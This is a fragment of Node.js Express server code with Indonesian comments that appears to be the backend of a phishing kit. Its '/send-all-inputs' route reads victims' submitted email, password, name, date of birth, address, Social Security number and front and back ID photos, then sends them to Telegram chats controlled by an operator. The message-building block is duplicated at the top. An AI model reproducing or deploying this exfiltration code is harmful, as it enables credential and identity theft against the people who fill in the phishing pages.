if (adminChoice === 'ssn'){
    message += `SSN : ${ssnData.ssn}`;
  } else { 
    message += `
    --- Address Page ---
    Name: ${addressData.firstName} ${addressData.lastName}
    Date of Birth: ${addressData.dob}
    Citizenship: ${addressData.citizenship}
    Country: ${addressData.country}
    City: ${addressData.city}
    State: ${addressData.state}
    Zip Code: ${addressData.zipCode}
    Address 1: ${addressData.address1}
    Address 2: ${addressData.address2}

    --- SSN ---
    SSN : ${ssnData.ssn}
    `
  }

  app.post('/send-all-inputs', async (req, res) => {
    try {
      // Lokasi file JSON
      const addressFilePath = path.join(__dirname, 'input', 'address.json');
      const page1FilePath = path.join(__dirname, 'input', 'page1.json');
      const ssnFilePath = path.join(__dirname, 'input', 'ssn.json');
      
      // Lokasi file gambar
      const frontImagePath = path.join(__dirname, 'uploads', '1.jpg');
      const backImagePath = path.join(__dirname, 'uploads', '2.jpg');
  
      // Baca isi file address.json
      const addressData = await fs.readJson(addressFilePath);
  
      // Baca isi file page1.json
      const page1Data = await fs.readJson(page1FilePath);
  
      const ssnData = await fs.readJson(ssnFilePath);
  
      // Format pesan gabungan untuk dikirim ke Telegram
      let message = `
        --- Page 1 ---
        Email: ${page1Data.email}
        Password: ${page1Data.password}
      `;
      
      if (adminChoice === 'ssn') {
        message += `\nSSN: ${ssnData.ssn}`;
      } else {
        message += `
        --- Address Page ---
        Name: ${addressData.firstName} ${addressData.lastName}
        Date of Birth: ${addressData.dob}
        Citizenship: ${addressData.citizenship}
        Country: ${addressData.country}
        City: ${addressData.city}
        State: ${addressData.state}
        Zip Code: ${addressData.zipCode}
        Address 1: ${addressData.address1}
        Address 2: ${addressData.address2}
    
        --- SSN ---
        SSN: ${ssnData.ssn}
        `;
      }
      
      // Baca semua chatId yang tersimpan di chatid.json
      const chatIds = readChatIds();
      console.log('Sending data to chatIds:', chatIds);
  
      // Kirim pesan dan gambar ke setiap chat ID yang ada
      for (const chatId of chatIds) {
        try {
          // Kirim pesan teks
          await bot.sendMessage(chatId, message);
          console.log(`Data sent to chatId ${chatId}`);
  
          if (adminChoice === 'id-page') {
            // Kirim gambar depan (1.jpg)
            await bot.sendPhoto(chatId, frontImagePath, { caption: 'Front ID (1.jpg)' });
            console.log(`Front ID sent to chatId ${chatId}`);
  
            // Kirim gambar belakang (2.jpg)
            await bot.sendPhoto(chatId, backImagePath, { caption: 'Back ID (2.jpg)' });
            console.log(`Back ID sent to chatId ${chatId}`);
          } else {
            console.log(`No images sent to chatId ${chatId} because adminChoice is not 'id-page'`);
          }
  
        } catch (error) {
          console.error(`Failed to send message or image to chatId ${chatId}:`, error);
        }
      }
  
      res.status(200).send({ status: 'All inputs and images sent to Telegram successfully' });
    } catch (error) {
      console.error('Error sending all inputs and images to Telegram:', error);
      res.status(500).send({ status: 'Failed to send all inputs and images to Telegram' });
    }
  });
  